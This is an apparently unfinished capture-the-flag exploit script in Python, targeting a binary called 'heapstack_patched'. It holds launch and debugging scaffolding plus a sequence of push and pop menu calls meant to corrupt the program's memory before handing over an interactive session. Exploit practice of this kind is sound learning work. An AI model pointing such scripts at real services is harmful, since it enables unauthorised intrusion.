#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./heapstack_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *0x4013C0
b *0x4012FB
b *0x40121B
# b *0x40134E
b *0x40136B
b *0x401296

c
'''

p = start()

# ==================== EXPLOIT ====================

def choice(option: int):
    sla(b'> ', option)


def hsuP():
    choice(b'0')


def push():
    choice(b'1')


def pop():
    choice(b'2')


def writeTOP(data):
    choice(b'3')
    sa(b': ', data)


def printTOP():
    choice(b'4')


def exploit():

    # ptr 0x404090

    push()
    push()
    push()

    pop()
    pop()

    hsuP()
    hsuP()


    pop()
    pop()

    push()

    pop()
    pop()

    # hsuP()
    # push()



    interactive()

if __name__ == '__main__':
    exploit()
